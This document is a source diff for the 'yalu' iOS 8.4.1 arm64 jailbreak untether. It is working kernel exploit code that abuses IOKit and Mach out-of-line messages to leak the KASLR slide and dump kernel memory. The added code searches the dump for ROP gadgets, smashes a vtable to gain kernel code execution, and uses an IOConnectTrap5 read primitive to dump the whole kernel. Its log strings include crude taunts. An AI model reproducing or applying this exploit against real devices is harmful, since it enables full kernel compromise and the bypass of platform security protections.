@@ -24,6 +24,16 @@ static char* copyoutDataFast(mach_port_t ref) {
         return msg->desc.address;
     return NULL;
 }
+static char* copyoutDataFastLen(mach_port_t ref, mach_vm_size_t* sz) {
+    char msgs[sizeof(oolmsg_t)+0x2000];
+    oolmsg_t *msg=(void*)&msgs[0];
+    bzero(msg,sizeof(oolmsg_t)+0x2000);
+    if(MACH_MSG_SUCCESS == mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, sizeof(oolmsg_t)+0x2000, ref, 0, MACH_PORT_NULL)) {
+        *sz = msg->desc.size;
+        return msg->desc.address;
+    }
+    return NULL;
+}
 static mach_port_t copyinDataFast(char* bytes, size_t size) {
     char msgs[sizeof(oolmsg_t)+0x2000];
     mach_port_t ref = 0;
@@ -61,9 +71,8 @@ int main(int argc, char** argv) {
     NSLog(@"yalu for ios841 arm64 untether by ~qwertyoruiop[kjc]");
     NSLog(@"+420 swags @ windknown, comex, ih8sn0w, posixninja, _morpheus_, haifisch, jk9357, ttwj, kim jong un");
     NSLog(@"-420 swags @ south (fake) korea, saurik, britta");
-    sleep(1);
     sync();
-    
+    sleep(1);
     kern_return_t err;
     io_iterator_t iterator;
     IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleHDQGasGaugeControl"), &iterator);
@@ -250,29 +259,30 @@ overlapped = copyinDataFast(pad, 1024 - 0x58);\
     far &= ~0xFFFFF;
     far -= 0x300000;
     uint64_t kaslr_slide = far;
-
-    NSLog(@"Beginning kernel dump..");
-    char* kern_dump = calloc(256, 0x10000);
-    for (int i = 0; i < 256; i++) {
+    NSLog(@"Dumping the kernel...");
+    sleep(1);
+    char* kern_dump = calloc(70, 0x10000);
+    for (int i = 1; i < 72; i++) {
         ReadToBuf();
         vmcopy->sz = 0x10000;
         vmcopy->ptr = 0xffffff8002002000 + kaslr_slide + i*vmcopy->sz;
         WriteFromBuf();
-        
-        char* data = ReadOverlapped();
+        mach_vm_size_t sz = 0;
+        char* data = copyoutDataFastLen(overlapped, &sz);
         SendOverlapped();
+        
         if (!data) {
-            usleep(400);
             continue;
         }
         memcpy(&kern_dump[i*vmcopy->sz], data, vmcopy->sz);
-        usleep(200);
+        usleep(500);
     }
     
     NSLog(@"Kernel dumped.");
     
     sleep(1);
     
+    bzero(buf, 4096);
     ReadToBuf();
     vmcopy->kfree_size = 512;
     WriteFromBuf();
@@ -284,13 +294,53 @@ overlapped = copyinDataFast(pad, 1024 - 0x58);\
     ReadToBuf();
     memcpy(&buf[2048], &buf[0], 2048);
     memcpy(&buf[0], vtdump, 2048);
+    uint64_t *buftable = (uint64_t*) &buf[0];
+    
+    /*
+     ffffff80042f789c	add	x0, x0, #232
+     ffffff80042f78a0	ret
+     */
+    
+    uint64_t add_x0_232 = (uint64_t)memmem(kern_dump, 70 * 0x10000, (&(char[]){0x00, 0xA0, 0x03, 0x91, 0xC0, 0x03, 0x5F, 0xD6}), 8);
+    if (!add_x0_232) {
+        NSLog(@"couldn't find gadget: add x0, x0, #232");
+        sleep(1000);
+    }
+    add_x0_232 -= (uint64_t) kern_dump;
+    
+    /*
+     ffffff80042f789c	add	x0, x0, #232
+     ffffff80042f78a0	ret
+     */
+    
+    uint64_t ldr_x0_x1_32 = (uint64_t)memmem(kern_dump, 70 * 0x10000, (&(char[]){0x20, 0x10, 0x40, 0xF9, 0xC0, 0x03, 0x5F, 0xD6}), 8);
+    if (!ldr_x0_x1_32) {
+        NSLog(@"couldn't find gadget: ldr x0 [x1, #32]");
+        sleep(1000);
+    }
+    ldr_x0_x1_32 -= (uint64_t) kern_dump;
+    
+    NSLog(@"Gaining code exec..");
+    
+    buftable = (uint64_t*) &buf[1024 - 0x58 + 232];
+    buftable[0] = 0x4141424243434444;
+    buftable[1] = 0xffffff8002002000 + kaslr_slide + ldr_x0_x1_32;
+    buftable[0x25] = 0xffffff8002002000 + kaslr_slide + add_x0_232;
     memcpy(&buf[1024 - 0x58], &buf[2048 + 1024 - 0x58], 32);
-
     vmcopy->type = kernalloc - 1024 + 0x58;
     WriteFromBuf();
-    
     /* smashed vtable! */
-    IOConnectTrap3(conn_, 0x13371337, 0x41414141, 0x42424242, 0x43434343);
+    
+    NSLog(@"Doing a full kernel dump now..");
+
+    char* real_kern_dump = malloc(0x10000 * 256);
+    for (int i = 0; i < 0x10000 * 256; i+=4) {
+        uint32_t read = IOConnectTrap5(conn_, 0, 0xffffff8002002000 + kaslr_slide + i - 32, 0x1337133742424242, 0x1337133743434343, 0x1337133744444444, 0x1337133745454545);
+        *(uint32_t*) (&real_kern_dump[i]) = read;
+    }
+    
+    NSLog(@"Done!");
+    
     
     memcpy(&buf[0], &buf[2048], 2048);
     WriteFromBuf();
